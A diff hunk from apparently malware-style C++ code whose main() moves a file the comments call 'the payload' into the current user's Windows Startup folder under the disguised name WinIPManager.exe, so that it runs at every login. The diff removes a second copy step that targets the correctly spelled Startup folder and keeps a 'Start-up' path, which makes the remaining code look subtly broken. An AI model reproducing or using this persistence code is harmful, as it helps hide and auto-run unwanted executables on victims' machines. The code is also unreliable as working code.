@@ -25,14 +25,9 @@ int main(int argc, char* argv[])
 	std::string newPayloadDirectory = "C:\\Users\\";
 	newPayloadDirectory += username;
 	newPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Start-up\\WinIPManager.exe";
-	
-	std::string otherPayloadDirectory = "C:\\Users\\";
-	otherPayloadDirectory += username;
-	otherPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinIPManager.exe";
 
 	// move the payload to startup
 	MoveFile("main.exe", newPayloadDirectory.c_str());
-	MoveFile("main.exe", otherPayloadDirectory.c_str());
 	
 	return 0;
 }
